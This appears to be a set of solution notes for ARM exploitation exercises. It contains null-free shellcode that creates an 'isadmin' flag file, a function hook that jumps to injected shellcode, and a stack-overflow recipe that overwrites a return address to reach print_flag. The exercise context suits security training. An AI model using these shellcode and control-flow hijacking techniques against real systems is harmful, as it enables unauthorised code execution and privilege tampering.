Nullifying
===============

.text

.global _start

_start:

//used for nulls
eor r2, r2

add r1, pc, #1
bx r1

.code 16
adr r3, file_name
strb r2, [r3, #8]

//create
mov r7, #8
adr r0, file_name
mov r1, #1
svc #1

push {r0}

//write
mov r7, #4
adr r1, w
mov r2, #1
svc #1

//close

pop {r0}
mov r7, #6
svc #1

bx lr

.align  2
file_name: .ascii "isadminXz"
.align 2
w: .ascii "1"



Captain Hook
=============

Address of pick_number  is 0x2a000980
Address of some_space   is 0x2a0009e4

The function pick_number seems to be in arm mode.
Every inst is 4 bytes.

For function pick_number:
We want to hook at the last inst address of pick_number which is 0x2a0009D0, the last line.
The last line of code is.

> POP {R11, PC}


++++++++++hook.s+++++
// We want to hook at address 0x2a0009d0
.data
hook_start:
	b shellcode
after_hook_start:

.text
// Place it at 0x2a0009e4
shellcode:
	push {r1, r2}
	push {r0} //contains the number

	//CREATE
	mov r7, #8 //creat syscall
	mov r1, #1 //write permission
	adr r0, file_name
	svc #0

	push {r0} //contains the FD

	//WRITE
	mov r7, #4 //write syscall
	mov r2, #4 //4 bytes
	add r1, sp, #4 //buff
	svc #0 // call write

	//CLOSE
	pop {r0} //pops the fd
	mov r7, #6
	svc #0

Override:
	pop {r0}
	pop {r1, r2}

	//original instruction
	pop {r11, pc}
	b after_hook_start

file_name: .asciz "answer"


One by one
============
It only branches to failure if its lesser than 256.
use python to generate a file of length 256.
feed it to the program

Stacking
============
put an input of 32 'a's followed by address of print_flag, then all zeros

